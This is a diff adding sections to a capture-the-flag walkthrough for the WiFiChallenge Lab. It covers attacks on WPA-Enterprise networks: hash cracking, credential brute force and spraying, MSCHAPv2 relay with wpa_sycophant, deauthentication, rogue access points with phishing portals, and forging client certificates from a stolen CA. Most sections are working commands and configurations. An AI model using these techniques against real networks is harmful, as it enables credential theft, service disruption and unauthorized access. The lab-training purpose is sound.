@@ -351,6 +351,8 @@ In Wireshark, just filter by certificates using the AP BBSID as filter (in this 
 
 ## MGT
 
+### What is Juan's flag on the wifi-corp AP website?
+
 To attack a mistrusted client on an MGT network we have to create a RogueAP with the same ESSID and configuration but with a self-signed certificate.
 
 After putting our **wlan0** interface in monitor mode, we now have an interface called **wlan0mon**. We will identify the channel of the target AP and gather its ESSID and BSSID.
@@ -392,4 +394,378 @@ Once connected we get your MSCHAPv2 credentials so we need to crack the hash to 
 hashcat -a 0 -m 5500 hash ~/rockyou-top100000.txt --force
 ```
 
-CONTOSO\juan.tr:bulldogs1234\
+Create a wpa supplicant configuration files
+
+```
+network={
+ssid="wifi-corp"
+proto=
+key_mgmt=WPA-EAP
+pairwise=CCMP
+auth_alg=OPEN
+eap=PEAP
+identity="CONTOSO\juan.tr"
+password="bulldogs1234"
+phase2="auth=MSCHAPV2"
+}
+```
+
+and then connect
+
+```bash
+wpa_supplicant -Dnl80211 -iwlan3 -c corp.conf
+```
+
+```bash
+dhclient wlan3 -v
+```
+
+### What is CONTOSO\test flag on the wifi-corp AP website?
+
+For this challenge we know the user name and perform a brute force attack with rockyou, for this we use “air-hammer”. For this it is important to take into account that it is necessary to have the domain.
+
+```bash
+cd  ~/tools/air-hammer
+echo 'CONTOSO\test' > test.user
+./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user
+```
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/1gOvurRdbOM2_8dKiFSCkw.png#center)
+
+After a few minutes:
+
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+### What is the flag for the user with pass 12345678 on the wifi-corp AP?
+
+This challenge is very similar to the previous one, but instead of performing a brute force attack, as we know the password we do a password spray, but for this we have to add the domain to the user list to make it the valid login.
+
+{% code overflow="wrap" %}
+```bash
+cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > ~/top-usernames-shortlist-contoso.txt
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+cd  ~/tools/air-hammer
+./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt
+```
+{% endcode %}
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/Jo_o8_c74nulz-bt47nbPA.png#center)
+
+After a few minutes:
+
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+### What is the flag on the wifi-regional-tablets AP?
+
+To perform this challenge we have to do a relay attack. MSCHAPv2 works the same as NetNTLM, so we can reuse the challenge from the AP by forwarding it to the legitimate client and reuse its response to access the real AP. For this we will use “wpa\_sycophant”.
+
+First we configure the name of the AP we want to connect to in “wpa\_sycophant” and we add the MAC of the fake AP we are going to lift, so if we are going to lift it with wlan1 we put the mac of that interface in “bssid\_blacklist”. But first we set the MAC for the BSSID AP.
+
+```bash
+systemctl stop network-manager
+airmon-ng stop wlan1mon
+ip link set wlan1 down
+macchanger -m F0:9F:C2:00:00:00 wlan1
+ip link set wlan1 up
+```
+
+```bash
+echo '
+network={
+  ssid="wifi-regional-tablets"
+  ## The SSID you would like to relay and authenticate against. 
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  ## Do not modify
+  identity=""
+  anonymous_identity=""
+  password=""
+  ## This initialises the variables for me.
+  ## -------------
+  eap=PEAP
+  phase1="crypto_binding=0 peaplabel=0"
+  phase2="auth=MSCHAPV2"
+  ## Dont want to connect back to ourselves,
+  ## so add your rogue BSSID here.
+  bssid_blacklist=F0:9F:C2:00:00:00
+}
+' > ~/tools/wpa_sycophant/wpa_sycophant_example.conf
+```
+
+To raise the RogueAP connected to “wpa\_sycophant” we use “berate\_ap”, very similar to “eaphammer” in the previous sections.
+
+{% code overflow="wrap" %}
+```bash
+#Shell 1
+cd ~/tools/berate_ap/
+./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
+```
+{% endcode %}
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/1pExeFzEVm2TGv8YM59QIw.png#center)
+
+We make a deauthentication attack on customers as usual. In this case 1 client uses MFT (802.11w) so it is not vulnerable to this attack, but the other client (64:32:A8:A9:DE:55) is.
+
+```bash
+# Shell 2
+airmon-ng start wlan0
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
+```
+
+Once we have the AP and we start the brute force we run “wpa\_sycophant” and wait for the client to connect to “berate\_ap” and “wpa\_sycophant” can reuse the information to connect to the real AP.
+
+```bash
+# Shell 3
+cd ~/tools/wpa_sycophant/
+./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
+```
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/7kK0F1flEMAlrpgSHCREOw.png#center)
+
+When the client connects to the RogueAP wpa\_sycophant connects to the real AP.
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/uBemCBjf1u9TymahtVQ4dw.png#center)
+
+In case wpa\_sycophant fails, try editing the “wpa\_sycophant\_example.conf” file by changing phase1:
+
+```bash
+phase1="peapver=1"
+```
+
+Once connected we can obtain IP by DHCP to access the web server.
+
+```bash
+# Shell 4
+dhclient wlan3 -v
+```
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/xb_evjFHr01by8-xFGV5OQ.png#center)
+
+### What is the flag on the wifi-regional AP?
+
+For this challenge we do the same exploit as the previous step, but modifying the pycophant file over the network for corporate computers (no tablets)
+
+```bash
+systemctl stop network-manager
+airmon-ng stop wlan1mon
+ip link set wlan1 down
+macchanger -m F0:9F:C2:00:00:00 wlan1
+ip link set wlan1 up
+```
+
+```bash
+echo '
+network={
+  ssid="wifi-regional"
+  ## The SSID you would like to relay and authenticate against. 
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  ## Do not modify
+  identity=""
+  anonymous_identity=""
+  password=""
+  ## This initialises the variables for me.
+  ## -------------
+  eap=PEAP
+  phase1="crypto_binding=0 peaplabel=0"
+  phase2="auth=MSCHAPV2"
+  ## Dont want to connect back to ourselves,
+  ## so add your rogue BSSID here.
+  bssid_blacklist=F0:9F:C2:00:00:00
+}
+' > ~/tools/wpa_sycophant/wpa_sycophant_example.conf
+```
+
+To raise the RogueAP connected to “wpa\_sycophant” we use “berate\_ap”, very similar to “eaphammer” in the previous sections.
+
+{% code overflow="wrap" %}
+```bash
+# Shell 1
+cd ~/tools/berate_ap/
+./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
+```
+{% endcode %}
+
+We make a deauthentication attack on customers as usual. In this case 1 client uses MFT (802.11w) so it is not vulnerable to this attack, but the other client (64:32:a8:a9:de:55) is.
+
+```bash
+# Shell 2
+airmon-ng start wlan0
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28  -c 64:32:a8:a9:de:55
+```
+
+Once we have the AP and we start the brute force we run “wpa\_sycophant” and wait for the client to connect to “berate\_ap” and “wpa\_sycophant” can reuse the information to connect to the real AP.
+
+```bash
+# Shell 3
+cd ~/tools/wpa_sycophant/
+./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
+```
+
+Once connected we can obtain IP by DHCP to access the web server.
+
+```bash
+# Shell 4
+dhclient wlan3 -v
+```
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/zOpry4-QiyMRLDIEMnx7TA.png#center)
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/57xxOptJiXa6UveR6WzURA.png#center)
+
+### What is the password of the user vulnerable to RogueAP of wifi-global?
+
+**Phishing+RogueAP (captive-portal)**&#x20;
+
+If we try to perform the same attacks as with the previous networks we can see that it is not possible, since as we have seen in the section on EAP methods, the AP only supports client certificate access.
+
+So we cannot attack this network, but we can attack its clients, because as we can see in the Probes, there is a client of this network that asks for the following networks “open-wifi,home-WiFi,WiFi-Restaurant”. So we can create an AP with that name, deauthenticate the wifi-global client and perform a phishing attack with a captive portal to obtain its credentials. For this we can use “eaphammer” with “ — captive-portal” and perform the deauthentication attack with “aireplay-ng”.
+
+```bash
+cd ~/tools/eaphammer
+sudo killall dnsmasq
+./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal
+```
+
+In parallel:
+
+```bash
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 wlan0mon -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51
+```
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/rNGksXiPsR8pTcRIC5WIbQ.png#center)
+
+**Responder+RogueAP (hostile-portal)**&#x20;
+
+Another option we have in this section is to perform a hostile portal attack, executing respond once connected to our Rogue AP. Same as before with — hostile-portal
+
+```bash
+cd ~/tools/eaphammer
+sudo killall dnsmasq
+./eaphammer --essid WiFi-Restaurant --interface wlan2 --hostile-portal
+```
+
+In parallel:
+
+```bash
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 wlan0mon -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51
+```
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/6dXeYR_HPBhzQbA7k3guew.png#center)
+
+After we get the hash:
+
+```bash
+cat logs/Responder-Session.log  | grep NTLMv2 | grep Hash | awk '{print $9}' > responder.5600
+
+hashcat -a 0 -m 5600 responder.5600 ~/rockyou-top100000.txt  --force
+```
+
+### What is the flag for Administrator on the wifi-corp AP website?
+
+Download all txt from the website
+
+```bash
+wget -A txt -m -p -E -k -K -np  http://192.168.7.1/.internalCA/
+```
+
+And we import the certificate.
+
+{% code overflow="wrap" %}
+```bash
+cd /root/tools/eaphammer
+python3 ./eaphammer --cert-wizard import --server-cert /home/user/Downloads/server.crt --ca-cert /home/user/Downloads/ca.crt --private-key /home/user/Downloads/server.key --private-key-passwd whatever
+```
+{% endcode %}
+
+We raise the AP and perform the deauth attack against client and the 2 APs.
+
+{% code overflow="wrap" %}
+```bash
+python3 ./eaphammer -i wlan4 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
+```
+{% endcode %}
+
+in parallel
+
+```bash
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:BA:6C:41
+```
+
+```bash
+airmon-ng start wlan1
+iwconfig wlan1mon channel 44
+aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan1mon -c 64:32:A8:BA:6C:41
+```
+
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+**Using berate\_ap**&#x20;
+
+We can use berate\_ap for this RogueAP too.
+
+Convert the files to PEM and create a DH:
+
+```bash
+openssl x509 -in ca.crt -out hostapd.ca.pem -outform PEM
+openssl x509 -in server.crt -out hostapd.cert.pem -outform PEM
+openssl rsa -in server.key -out hostapd.key.pem
+openssl dhparam -out hostapd.dh.pem 2048
+```
+
+Now we can create the RogueAP with berate\_ap
+
+{% code overflow="wrap" %}
+```bash
+./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan4 lo wifi-corp --eap-cert-path /home/user/Downloads/
+```
+{% endcode %}
+
+### What is the flag found on the wifi-global AP?
+
+Once we have the CA we can create a client certificate to access the wifi-global network legitimately, since we have a legitimate user. To do this we generate the certificate with the CA and the downloaded configuration files.
+
+{% code overflow="wrap" %}
+```bash
+cd /home/user/Downloads
+openssl genrsa -out client.key 2048
+openssl req -config client.conf -new -key client.key -out client.csr
+openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in client.csr -req -out client.crt
+```
+{% endcode %}
+
+Once we have the certificate we can generate a configuration file for “wpa\_supplicant” and then access the web server for the flag.
+
+```bash
+echo 'network={
+ ssid="wifi-global"
+ scan_ssid=1
+ mode=0
+ proto=RSN
+ key_mgmt=WPA-EAP
+ auth_alg=OPEN
+ eap=TLS
+    #anonymous_identity="GLOBAL\anonymous"
+ identity="GLOBAL\GlobalAdmin"
+ ca_cert="./ca.crt"
+ client_cert="./client.crt"
+ private_key="./client.key"
+ private_key_passwd="whatever" 
+}
+' > wpa_tls.conf
+
+wpa_supplicant -Dnl80211 -i wlan4 -c wpa_tls.conf
+```
+
+And now we are connected to the AP using a certificate.
+
+![](https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/Challenge25.png#center)
